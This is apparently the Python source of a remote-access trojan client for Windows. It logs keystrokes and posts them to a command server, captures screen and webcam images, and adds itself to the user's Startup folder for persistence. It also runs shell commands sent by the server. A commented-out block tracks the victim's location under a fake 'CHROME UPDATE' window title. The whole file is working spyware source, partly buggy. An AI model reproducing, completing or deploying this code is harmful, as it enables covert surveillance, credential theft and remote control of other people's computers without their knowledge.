import getpass
import os
import pathlib
import subprocess
import threading
from datetime import datetime
from time import sleep

import cv2
import keyboard
import numpy as np
import pyautogui
import requests
from numpy import ceil

width, height = pyautogui.size()

USER_NAME = getpass.getuser()

path = os.getcwd()

"""
def location_log():
    while True:
        try:
            driver.execute_script("document.title='CHROME UPDATE WITH LOCATION'")
            driver.get('https://www.gps-coordinates.net/my-location')
            driver.execute_script("document.title='CHROME UPDATE WITH LOCATION'")

            def get_spans():
                global spans
                spans = [i.text for i in driver.find_elements(By.TAG_NAME, "span")]

                if spans[4] == "" or spans[5] == "" or spans[6] == "":
                    print(spans[4:7])
                    get_spans()
                else:
                    print("yah", spans[4:7])

            get_spans()
            print(" | ".join(spans[4:7]))
        except Exception as e:
            print(e)
        finally:

            bot.send_message(chat, " | ".join(spans[4:7]))
            sleep(60)

"""


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    os.makedirs(bat_path, exist_ok=True)
    cur = os.curdir
    os.chdir(bat_path)
    if os.path.exists(os.path.join(bat_path, "open.bat")):
        with open(bat_path + '\\' + "open.bat", "w") as bat_file:
            bat_file.write("")
    with open(bat_path + '\\' + "open.bat", "r") as bat_file:
        if not bat_file.read().__contains__(file_path):
            with open(bat_path + '\\' + "open.bat", "w+") as bat_fil:
                bat_fil.write(
                    'cd %s\n' % os.path.join(file_path, "R.py") + r' pythonw %s' % os.path.join(file_path,
                                                                                                "stream.py"))

    os.chdir(path)


def screenstream2():
    c = pyautogui.screenshot()
    im = cv2.cvtColor(np.array(c), cv2.COLOR_RGB2BGR)
    _, jpeg = cv2.imencode(".jpg", im)
    return jpeg.tobytes()


class R:
    def __init__(self):
        self.k = None
        self.frac = 1000
        self._url = " http://127.0.0.1:8000/messages"
        self.req_type = "file"  # text
        self.response_type = ["screen", "cam"]
        self.file_name = ""
        self.cam = 0
        self.c = cv2.VideoCapture(self.cam)
        self.payload = ""
        self.keylog()
        self.ping()

    def ping(self):
        while True:
            r = str(requests.get(self._url).content)
            print(self.k.log)
            self.k.report(self)
            if r.__contains__("online"):
                pass
            else:
                print("j")
            sleep(7)

    def _file(self):
        with requests.get(self._url) as r:
            parent = pathlib.Path(self.file_name).parent
            os.makedirs(parent, exist_ok=True)
            open(self.file_name, "wb").write(r)

    def dialog_response(self, data):
        print(data)
        r = requests.get(self._url, json=data)
        print(str(r.content))

    class Keylogger:
        def __init__(self, interval=0.00000000000000000001):
            # we gonna pass SEND_REPORT_EVERY to interval
            self.filename = None
            self.interval = interval

            # this is the string variable that contains the log of all
            # the keystrokes within `self.interval`
            self.log = ""
            # record start & end datetimes
            self.start_dt = datetime.now()
            self.end_dt = datetime.now()

        def callback(self, event):
            """
            This callback is invoked whenever a keyboard event is occured
            (i.e when a key is released in this example)
            """
            name = event.name
            if len(name) > 1:
                # not a character, special key (e.g ctrl, alt, etc.)
                # uppercase with []
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
            # finally, add the key name to our global `self.log` variable
            self.log += name

        def report(self, cla):
            """
            This function gets called every `self.interval`
            It basically sends keylogs and resets `self.log` variable
            """

            if self.log:
                # if there is something in log, report it
                self.end_dt = datetime.now()
                # update `self.filename`
                print(self.log)
                # if you want to print in the console, uncomment below line
                # print(f"[{self.filename}] - {self.log}")
                self.start_dt = datetime.now()
                try:
                    cla.dialog_response(
                        {"type": "keyboard", "from_": "|".join(pyautogui.getInfo()[:3]), "content": self.log})
                except Exception as e:
                    print(e)
            self.log = ""

        def start(self, cla):
            # record the start datetime
            self.start_dt = datetime.now()
            # start the keylogger
            keyboard.on_release(callback=self.callback)
            # start reporting the keylogs
            # block the current thread, wait until CTRL+C is pressed
            # keyboard.wait()

    def webstream(self):
        _, frame = self.c.read()
        _, jpeg = cv2.imencode(".jpg", frame)
        return jpeg.tobytes()

    def code(self, inp):
        try:

            print(inp)
            if inp.split(" ")[0] == "cd":
                os.chdir(inp.split(" ")[1])
                self.dialog_response(os.getcwd())
            else:
                process = subprocess.run(inp.split(" "), shell=True, capture_output=True, text=True)
                print(len(process.stdout))
                v = int(ceil((len(process.stdout) / self.frac)))
                print(v)
                if v <= 1:
                    v = 1
                print(v)
                for i in range(v + 1):
                    try:
                        self.dialog_response(i)
                    except Exception as e:
                        self.dialog_response(e)

        except Exception as e:
            print(e)

    def keylog(self):
        self.k = self.Keylogger(0.0000000000000000000000000000000001)
        self.k.start(self)


r = R()
"""                x = r.split("|")
    if x[0] == "file":
        self.file_name = x[1]
        self._file()
    else:
        self.code(r)
sleep(7)"""